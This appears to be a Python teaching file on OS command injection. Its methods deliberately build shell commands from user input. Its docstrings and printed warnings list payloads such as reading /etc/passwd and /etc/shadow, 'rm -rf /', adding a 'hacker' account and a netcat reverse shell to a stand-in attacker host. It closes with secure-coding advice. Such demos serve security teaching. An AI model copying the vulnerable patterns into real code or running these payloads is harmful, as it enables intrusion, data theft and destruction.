"""
Command Injection Vulnerability Demo
===================================

VULNERABILITY TYPE: Command Injection / OS Command Injection
SEVERITY: Critical
DESCRIPTION: This file demonstrates command injection vulnerabilities where user input
is directly used in system commands without proper validation or sanitization.

ATTACK VECTORS:
- Shell metacharacters: ; & | ` $ ( ) { } [ ] && || > < >> << 
- Command chaining: command1; command2
- Command substitution: `command` or $(command)
- Piping: command1 | command2

IMPACT:
- Complete system compromise
- Arbitrary code execution
- Data exfiltration
- System information disclosure
- Privilege escalation
- Denial of service
"""

import os
import subprocess
import shlex
import platform

class VulnerableSystemManager:
    
    def __init__(self):
        self.system_info = {
            'os': platform.system(),
            'platform': platform.platform(),
            'architecture': platform.architecture()[0]
        }
    
    def vulnerable_ping(self, hostname):
        """
        🚨 VULNERABILITY: Command Injection in Network Ping
        
        ISSUE: User input directly concatenated into system command
        ATTACK: hostname like "google.com; cat /etc/passwd" or "google.com && rm -rf /"
        """
        
        # VULNERABLE CODE: Direct command concatenation
        if self.system_info['os'] == 'Windows':
            command = f"ping -n 4 {hostname}"
        else:
            command = f"ping -c 4 {hostname}"
        
        print(f"[VULNERABLE] Executing command: {command}")
        
        try:
            # EXTREMELY DANGEROUS: Direct command execution
            result = os.system(command)
            return {
                'command': command,
                'hostname': hostname,
                'exit_code': result,
                'message': 'Command executed successfully'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerable_file_search(self, filename, directory="."):
        """
        🚨 VULNERABILITY: Command Injection in File Search
        
        ISSUE: User input used in find/dir command without validation
        ATTACK: filename like "*.txt; cat /etc/passwd" or "*.txt && whoami"
        """
        
        # VULNERABLE CODE: Direct command construction
        if self.system_info['os'] == 'Windows':
            command = f'dir /s /b "{directory}\\{filename}"'
        else:
            command = f'find "{directory}" -name "{filename}" -type f'
        
        print(f"[VULNERABLE] Executing search: {command}")
        
        try:
            # DANGEROUS: Using shell=True with user input
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return {
                'command': command,
                'filename': filename,
                'directory': directory,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Command timed out'}
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerable_log_analysis(self, log_file, pattern):
        """
        🚨 VULNERABILITY: Command Injection in Log Analysis
        
        ISSUE: User input used in grep/findstr command
        ATTACK: pattern like "ERROR; cat /etc/passwd" or "ERROR && id"
        """
        
        # VULNERABLE CODE: Direct grep command construction
        if self.system_info['os'] == 'Windows':
            command = f'findstr "{pattern}" "{log_file}"'
        else:
            command = f'grep "{pattern}" "{log_file}"'
        
        print(f"[VULNERABLE] Analyzing logs: {command}")
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
            return {
                'command': command,
                'log_file': log_file,
                'pattern': pattern,
                'matches': result.stdout,
                'errors': result.stderr
            }
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerable_backup_creator(self, source_dir, backup_name):
        """
        🚨 VULNERABILITY: Command Injection in Backup Creation
        
        ISSUE: User input used in tar/zip command without validation
        ATTACK: backup_name like "backup.tar; rm -rf /" or "backup.tar && cat /etc/passwd"
        """
        
        # VULNERABLE CODE: Direct tar command construction
        if self.system_info['os'] == 'Windows':
            command = f'powershell Compress-Archive -Path "{source_dir}" -DestinationPath "{backup_name}.zip"'
        else:
            command = f'tar -czf "{backup_name}.tar.gz" "{source_dir}"'
        
        print(f"[VULNERABLE] Creating backup: {command}")
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {
                'command': command,
                'source_dir': source_dir,
                'backup_name': backup_name,
                'success': result.returncode == 0,
                'output': result.stdout,
                'errors': result.stderr
            }
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerable_network_info(self, interface_name):
        """
        🚨 VULNERABILITY: Command Injection in Network Information
        
        ISSUE: User input used in ifconfig/ipconfig command
        ATTACK: interface_name like "eth0; cat /etc/shadow" or "eth0 && netstat -an"
        """
        
        # VULNERABLE CODE: Direct network command construction
        if self.system_info['os'] == 'Windows':
            command = f'ipconfig /all | findstr "{interface_name}"'
        else:
            command = f'ifconfig {interface_name}'
        
        print(f"[VULNERABLE] Getting network info: {command}")
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return {
                'command': command,
                'interface': interface_name,
                'info': result.stdout,
                'errors': result.stderr
            }
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerable_process_killer(self, process_name):
        """
        🚨 CRITICAL VULNERABILITY: Command Injection in Process Management
        
        ISSUE: User input used in kill/taskkill command
        ATTACK: process_name like "notepad; shutdown -h now" or "notepad && format c:"
        """
        
        # VULNERABLE CODE: Direct kill command construction
        if self.system_info['os'] == 'Windows':
            command = f'taskkill /F /IM "{process_name}"'
        else:
            command = f'pkill -f "{process_name}"'
        
        print(f"[EXTREMELY DANGEROUS] Killing process: {command}")
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
            return {
                'command': command,
                'process_name': process_name,
                'result': 'Process termination attempted',
                'output': result.stdout,
                'errors': result.stderr
            }
        except Exception as e:
            return {'error': str(e)}

# Example usage demonstrating the vulnerabilities
if __name__ == "__main__":
    print("=== COMMAND INJECTION VULNERABILITY DEMONSTRATIONS ===\n")
    
    manager = VulnerableSystemManager()
    
    # 1. Normal ping usage
    print("1. Normal Ping Usage:")
    result = manager.vulnerable_ping("google.com")
    print(f"Result: {result.get('message', result.get('error'))}\n")
    
    # 2. Command Injection Attack - Information Disclosure
    print("2. Command Injection Attack - Information Disclosure:")
    if manager.system_info['os'] == 'Windows':
        malicious_hostname = "google.com & whoami"
    else:
        malicious_hostname = "google.com; whoami"
    
    result = manager.vulnerable_ping(malicious_hostname)
    print(f"Attack attempted with: {malicious_hostname}")
    print(f"Result: {result}\n")
    
    # 3. File Search Injection
    print("3. File Search Command Injection:")
    if manager.system_info['os'] == 'Windows':
        malicious_filename = '*.txt" & echo "INJECTED COMMAND" & echo "'
    else:
        malicious_filename = '*.txt"; echo "INJECTED COMMAND"; echo "'
    
    result = manager.vulnerable_file_search(malicious_filename)
    print(f"Search injection result: {result.get('stdout', result.get('error'))}\n")
    
    # 4. Log Analysis Injection
    print("4. Log Analysis Command Injection:")
    if manager.system_info['os'] == 'Windows':
        malicious_pattern = 'ERROR" & echo "LOG INJECTION" & echo "'
    else:
        malicious_pattern = 'ERROR"; echo "LOG INJECTION"; echo "'
    
    result = manager.vulnerable_log_analysis("nonexistent.log", malicious_pattern)
    print(f"Log analysis attack: {result.get('matches', result.get('error'))}\n")
    
    # 5. Network Information Injection
    print("5. Network Information Command Injection:")
    if manager.system_info['os'] == 'Windows':
        malicious_interface = 'eth0" & echo "NETWORK INJECTION" & echo "'
    else:
        malicious_interface = 'eth0; echo "NETWORK INJECTION"'
    
    result = manager.vulnerable_network_info(malicious_interface)
    print(f"Network info attack: {result.get('info', result.get('error'))}\n")
    
    print("=== ⚠️  WARNING: More Dangerous Attacks Possible ===")
    print("🚨 Real attackers could use commands like:")
    print("   - Linux: '; rm -rf /' (delete all files)")
    print("   - Linux: '; cat /etc/passwd' (read password file)")
    print("   - Linux: '; nc -e /bin/sh attacker_ip 4444' (reverse shell)")
    print("   - Windows: '& del /f /s /q C:\\*' (delete files)")
    print("   - Windows: '& net user hacker password123 /add' (create user)")
    print("   - Both: Command to download and execute malware")
    
    print("\n=== SECURITY RECOMMENDATIONS ===")
    print("✅ NEVER use os.system() or subprocess with shell=True and user input")
    print("✅ Use subprocess with argument lists instead of shell commands")
    print("✅ Validate and sanitize all user inputs")
    print("✅ Use allowlists for permitted values")
    print("✅ Run with minimal privileges")
    print("✅ Example secure code:")
    print("   import subprocess")
    print("   import shlex")
    print("   def secure_ping(hostname):")
    print("       # Validate hostname format")
    print("       if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):")
    print("           raise ValueError('Invalid hostname')")
    print("       # Use argument list instead of shell command")
    print("       result = subprocess.run(['ping', '-c', '4', hostname], ")
    print("                              capture_output=True, text=True)")
    print("       return result.stdout") 